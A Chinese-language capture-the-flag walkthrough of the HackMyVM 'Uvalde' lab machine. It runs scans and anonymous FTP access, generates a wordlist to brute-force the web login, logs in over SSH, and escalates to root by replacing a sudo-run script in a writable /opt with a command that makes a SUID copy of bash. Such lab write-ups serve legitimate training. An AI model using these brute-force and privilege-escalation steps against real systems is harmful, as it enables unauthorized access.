# hmv_uvalde

# 0.简介

**靶机**：https://hackmyvm.eu/machines/machine.php?vm=Uvalde  
**难度**：绿色  
**目标 IP**：192.168.205.149  
**本机 IP**：192.168.205.128

# 1.扫描

​`nmap`​起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -A -Pn -n --min-rate 10000 192.168.205.149
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-08 09:15 CST
Nmap scan report for 192.168.205.149
Host is up (0.00022s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.205.128
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1000     1000         5154 Jan 28  2023 output
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 3a:09:a4:da:d7:db:99:ee:a5:51:05:e9:af:e7:08:90 (RSA)
|   256 cb:42:6a:be:22:13:2c:f2:57:f9:80:d1:f7:fb:88:5c (ECDSA)
|_  256 44:3c:b4:0f:aa:c3:94:fa:23:15:19:e3:e5:18:56:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Agency - Start Bootstrap Theme
MAC Address: 08:00:27:79:3A:5B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.22 ms 192.168.205.149

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.35 seconds

```

# 2.踩点

```
┌──(kali㉿kali)-[~/test]
└─$ ftp 192.168.205.149                          
Connected to 192.168.205.149.
220 (vsFTPd 3.0.3)
Name (192.168.205.149:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
229 Entering Extended Passive Mode (|||61334|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        116          4096 Jan 28  2023 .
drwxr-xr-x    2 0        116          4096 Jan 28  2023 ..
-rw-r--r--    1 1000     1000         5154 Jan 28  2023 output
226 Directory send OK.
ftp> mget output
mget output [anpqy?]? y
229 Entering Extended Passive Mode (|||41326|)
150 Opening BINARY mode data connection for output (5154 bytes).
100% |*****************************************************************************************|  5154        9.15 MiB/s    00:00 ETA
226 Transfer complete.
5154 bytes received in 00:00 (4.77 MiB/s)
ftp> exit
221 Goodbye.
                              
┌──(kali㉿kali)-[~/test]
└─$ file output 
output: Unicode text, UTF-8 text, with very long lines (328), with CRLF, CR, LF line terminators, with escape sequences, with overstriking
           
┌──(kali㉿kali)-[~/test]
└─$ cat output  
Script démarré sur 2023-01-28 19:54:05+01:00 [TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="105" LINES="25"]
matthew@debian:~$ id
uid=1000(matthew) gid=1000(matthew) groupes=1000(matthew)
matthew@debian:~$ ls -al
total 32
drwxr-xr-x 4 matthew matthew 4096 28 janv. 19:54 .
drwxr-xr-x 3 root    root    4096 23 janv. 07:52 ..
lrwxrwxrwx 1 root    root       9 23 janv. 07:53 .bash_history -> /dev/null
-rw-r--r-- 1 matthew matthew  220 23 janv. 07:51 .bash_logout
-rw-r--r-- 1 matthew matthew 3526 23 janv. 07:51 .bashrc
drwx------ 3 matthew matthew 4096 23 janv. 08:04 .config
drwxr-xr-x 3 matthew matthew 4096 23 janv. 08:04 .local
-rw-r--r-- 1 matthew matthew  807 23 janv. 07:51 .profile
-rw-r--r-- 1 matthew matthew    0 28 janv. 19:54 typescript
-rwx------ 1 matthew matthew   33 23 janv. 07:53 user.txt
matthew@debian:~$ toilet -f mono12 -F metal hackmyvm.eu
                                                                              
 ▄▄                            ▄▄                                             
 ██                            ██                                             
 ██▄████▄   ▄█████▄   ▄█████▄  ██ ▄██▀   ████▄██▄  ▀██  ███  ██▄  ▄██  ████▄██▄ 
 ██▀   ██   ▀ ▄▄▄██  ██▀    ▀  ██▄██     ██ ██ ██   ██▄ ██    ██  ██   ██ ██ ██ 
 ██    ██  ▄██▀▀▀██  ██        ██▀██▄    ██ ██ ██    ████▀    ▀█▄▄█▀   ██ ██ ██ 
 ██    ██  ██▄▄▄███  ▀██▄▄▄▄█  ██  ▀█▄   ██ ██ ██     ███      ████    ██ ██ ██ 
 ▀▀    ▀▀   ▀▀▀▀ ▀▀    ▀▀▀▀▀   ▀▀   ▀▀▀  ▀▀ ▀▀ ▀▀     ██        ▀▀     ▀▀ ▀▀ ▀▀ 
                                                    ███                       
                                                                              
                                                                              
                                                                              
                                                                              
            ▄████▄   ██    ██                                                 
           ██▄▄▄▄██  ██    ██                                                 
           ██▀▀▀▀▀▀  ██    ██                                                 
    ██     ▀██▄▄▄▄█  ██▄▄▄███                                                 
    ▀▀       ▀▀▀▀▀    ▀▀▀▀ ▀▀                                                 
                                                                              
                                                                              
matthew@debian:~$ exit
exit

Script terminé sur 2023-01-28 19:54:37+01:00 [COMMAND_EXIT_CODE="0"]
                                                                         
```

暂时没啥作用，继续踩点。页面是静态的，看一下有没有什么明显漏洞

```
┌──(kali㉿kali)-[~/test]
└─$ nuclei -u http://192.168.205.149             

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.3.8

                projectdiscovery.io

[WRN] Found 2 templates with runtime error (use -validate flag for further examination)
[INF] Current nuclei version: v3.3.8 (latest)
[INF] Current nuclei-templates version: v10.1.2 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 52
[INF] Templates loaded for current scan: 7654
[INF] Executing 7274 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 380 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1693 (Reduced 1591 Requests)
[INF] Using Interactsh Server: oast.live
[missing-sri] [http] [info] http://192.168.205.149 ["https://fonts.googleapis.com/css?family=Montserrat:400,700","https://fonts.googleapis.com/css?family=Kaushan+Script","https://fonts.googleapis.com/css?family=Droid+Serif:400,700,400italic,700italic","https://fonts.googleapis.com/css?family=Roboto+Slab:400,100,300,700"]                                                                              
[waf-detect:apachegeneric] [http] [info] http://192.168.205.149
[openssh-detect] [tcp] [info] 192.168.205.149:22 ["SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1"]
[ssh-server-enumeration] [javascript] [info] 192.168.205.149:22 ["SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1"]
[ssh-auth-methods] [javascript] [info] 192.168.205.149:22 ["["publickey","password"]"]
[ssh-password-auth] [javascript] [info] 192.168.205.149:22
[ssh-sha1-hmac-algo] [javascript] [info] 192.168.205.149:22
[CVE-2023-48795] [javascript] [medium] 192.168.205.149:22 ["Vulnerable to Terrapin"]
[ftp-anonymous-login] [tcp] [medium] 192.168.205.149:21
[tech-detect:font-awesome] [http] [info] http://192.168.205.149
[tech-detect:bootstrap] [http] [info] http://192.168.205.149
[tech-detect:google-font-api] [http] [info] http://192.168.205.149
[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.205.149
[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.205.149
[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.205.149
[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.205.149
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.205.149
[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.205.149
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.205.149
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.205.149
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.205.149
[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.205.149
[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.205.149
[form-detection] [http] [info] http://192.168.205.149
[apache-detect] [http] [info] http://192.168.205.149 ["Apache/2.4.54 (Debian)"]
[package-json] [http] [info] http://192.168.205.149/package.json
[package-json] [http] [info] http://192.168.205.149/package-lock.json
                                             
```

没看到啥，那我们去爆破目录

```
┌──(kali㉿kali)-[~/test]
└─$ gobuster dir -u http://192.168.205.149 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,md | grep -v "403"
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.149
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login.php            (Status: 200) [Size: 1022]
/js                   (Status: 301) [Size: 315] [--> http://192.168.205.149/js/]
/index.php            (Status: 200) [Size: 29604]
/css                  (Status: 301) [Size: 316] [--> http://192.168.205.149/css/]
/user.php             (Status: 302) [Size: 0] [--> login.php]
/img                  (Status: 301) [Size: 316] [--> http://192.168.205.149/img/]
/create_account.php   (Status: 200) [Size: 1003]
/mail                 (Status: 301) [Size: 317] [--> http://192.168.205.149/mail/]
/.                    (Status: 200) [Size: 29604]
/success.php          (Status: 302) [Size: 0] [--> login.php]
/vendor               (Status: 301) [Size: 319] [--> http://192.168.205.149/vendor/]
Progress: 598000 / 598005 (100.00%)
===============================================================
Finished
===============================================================
                                                                 
```

有一个注册/create_account.php，我们尝试注册

![image](assets/image-20250208092519-sns84x7.png)

后面那一串有点像64,我们拿起解密看看

![image](assets/image-20250208092623-8oxemyq.png)

可以看到它的密码格式是以用户名+注册年+@+随机4位数，那我们生成字典爆破一下

```
┌──(kali㉿kali)-[~/test]
└─$ for i in $(seq -w 0 9999); do echo "matthew2023@$i" ;done > pass
```

打开我们的burp

![image](assets/image-20250208093236-5dmc1ys.png)

![image](assets/image-20250208093257-yv5jokl.png)

421长度明显不一样，我们使用这个密码测试登录

![image](assets/image-20250208093442-m2ddsnf.png)

我们先尝试可不可以ssh登录

```
┌──(kali㉿kali)-[~/test]
└─$ ssh matthew@192.168.205.149
The authenticity of host '192.168.205.149 (192.168.205.149)' can't be established.
ED25519 key fingerprint is SHA256:S2tp/jV32/GtUP68f14Rac4/yZXhbMmyut+ZqO+ZOl4.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:6: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.149' (ED25519) to the list of known hosts.
matthew@192.168.205.149's password: 
Linux uvalde.hmv 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
matthew@uvalde:~$ id
uid=1000(matthew) gid=1000(matthew) groups=1000(matthew)

```

# 3.提权

```
matthew@uvalde:~$ sudo -l
Matching Defaults entries for matthew on uvalde:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User matthew may run the following commands on uvalde:
    (ALL : ALL) NOPASSWD: /bin/bash /opt/superhack
matthew@uvalde:~$ ls -la /opt/
total 12
drwx---rwx  2 root root 4096 Feb  5  2023 .
drwxr-xr-x 18 root root 4096 Jan 22  2023 ..
-rw-r--r--  1 root root 1594 Jan 31  2023 superhack
matthew@uvalde:~$ cat /opt/superhack 
#! /bin/bash 
clear -x

GRAS=$(tput bold)
JAUNE=$(tput setaf 3)$GRAS
BLANC=$(tput setaf 7)$GRAS
BLEU=$(tput setaf 4)$GRAS
VERT=$(tput setaf 2)$GRAS
ROUGE=$(tput setaf 1)$GRAS
RESET=$(tput sgr0)

cat << EOL


 _______  __   __  _______  _______  ______    __   __  _______  _______  ___   _ 
|       ||  | |  ||       ||       ||    _ |  |  | |  ||   _   ||       ||   | | |
|  _____||  | |  ||    _  ||    ___||   | ||  |  |_|  ||  |_|  ||       ||   |_| |
| |_____ |  |_|  ||   |_| ||   |___ |   |_||_ |       ||       ||       ||      _|
|_____  ||       ||    ___||    ___||    __  ||       ||       ||      _||     |_ 
 _____| ||       ||   |    |   |___ |   |  | ||   _   ||   _   ||     |_ |    _  |
|_______||_______||___|    |_______||___|  |_||__| |__||__| |__||_______||___| |_|



EOL


printf "${BLANC}Tool:${RESET} ${BLEU}superHack${RESET}\n"
printf "${BLANC}Author:${RESET} ${BLEU}hackerman${RESET}\n"
printf "${BLANC}Version:${RESET} ${BLEU}1.0${RESET}\n"

printf "\n"

[[ $# -ne 0 ]] && echo -e "${BLEU}Usage:${RESET} $0 domain" && exit

while [ -z "$domain" ]; do
read -p "${VERT}domain to hack:${RESET} " domain
done

printf "\n"

n=50

string=""
for ((i=0; i<$n; i++))
do
string+="."
done

for ((i=0; i<$n; i++))
do
string="${string/./#}"
printf "${BLANC}Hacking progress...:${RESET} ${BLANC}[$string]${RESET}\r"
sleep .09
done

printf "\n"
printf "${JAUNE}Target $domain ====> PWNED${RESET}\n"
printf "${JAUNE}URL: https://$domain/*********************.php${RESET}\n"

echo -e "\n${ROUGE}Pay 0.000047 BTC to 3FZbgi29cpjq2GjdwV8eyHuJJnkLtktZc5 to unlock backdoor.${RESET}\n"

```

我们可以修改当前目录，使用把脚本换一下就好了

```
matthew@uvalde:/opt$ mv superhack superhack1
matthew@uvalde:/opt$ ls -la
total 12
drwx---rwx  2 root root 4096 Feb  8 02:37 .
drwxr-xr-x 18 root root 4096 Jan 22  2023 ..
-rw-r--r--  1 root root 1594 Jan 31  2023 superhack1
matthew@uvalde:/opt$ echo 'cp /bin/bash /tmp/sh;chmod u+s /tmp/sh' > superhack
matthew@uvalde:/opt$ ls -al
total 16
drwx---rwx  2 root    root    4096 Feb  8 02:38 .
drwxr-xr-x 18 root    root    4096 Jan 22  2023 ..
-rw-r--r--  1 matthew matthew   39 Feb  8 02:38 superhack
-rw-r--r--  1 root    root    1594 Jan 31  2023 superhack1
matthew@uvalde:/opt$ ls -la /tmp/
total 40
drwxrwxrwt 10 root root 4096 Feb  8 02:29 .
drwxr-xr-x 18 root root 4096 Jan 22  2023 ..
drwxrwxrwt  2 root root 4096 Feb  8 02:14 .font-unix
drwxrwxrwt  2 root root 4096 Feb  8 02:14 .ICE-unix
drwx------  3 root root 4096 Feb  8 02:14 systemd-private-da80bce88f6c483fb3f7d4a8a59370c0-apache2.service-l1oDZf
drwx------  3 root root 4096 Feb  8 02:14 systemd-private-da80bce88f6c483fb3f7d4a8a59370c0-systemd-logind.service-fSJRkg
drwx------  3 root root 4096 Feb  8 02:14 systemd-private-da80bce88f6c483fb3f7d4a8a59370c0-systemd-timesyncd.service-UNC5xf
drwxrwxrwt  2 root root 4096 Feb  8 02:14 .Test-unix
drwxrwxrwt  2 root root 4096 Feb  8 02:14 .X11-unix
drwxrwxrwt  2 root root 4096 Feb  8 02:14 .XIM-unix
matthew@uvalde:/opt$ sudo /bin/bash /opt/superhack
matthew@uvalde:/opt$ ls -la /tmp/
total 1248
drwxrwxrwt 10 root root    4096 Feb  8 02:39 .
drwxr-xr-x 18 root root    4096 Jan 22  2023 ..
drwxrwxrwt  2 root root    4096 Feb  8 02:14 .font-unix
drwxrwxrwt  2 root root    4096 Feb  8 02:14 .ICE-unix
-rwsr-xr-x  1 root root 1234376 Feb  8 02:39 sh
drwx------  3 root root    4096 Feb  8 02:14 systemd-private-da80bce88f6c483fb3f7d4a8a59370c0-apache2.service-l1oDZf
drwx------  3 root root    4096 Feb  8 02:14 systemd-private-da80bce88f6c483fb3f7d4a8a59370c0-systemd-logind.service-fSJRkg
drwx------  3 root root    4096 Feb  8 02:14 systemd-private-da80bce88f6c483fb3f7d4a8a59370c0-systemd-timesyncd.service-UNC5xf
drwxrwxrwt  2 root root    4096 Feb  8 02:14 .Test-unix
drwxrwxrwt  2 root root    4096 Feb  8 02:14 .X11-unix
drwxrwxrwt  2 root root    4096 Feb  8 02:14 .XIM-unix
matthew@uvalde:/opt$ /tmp/sh -p
sh-5.1# id
uid=1000(matthew) gid=1000(matthew) euid=0(root) groups=1000(matthew)

```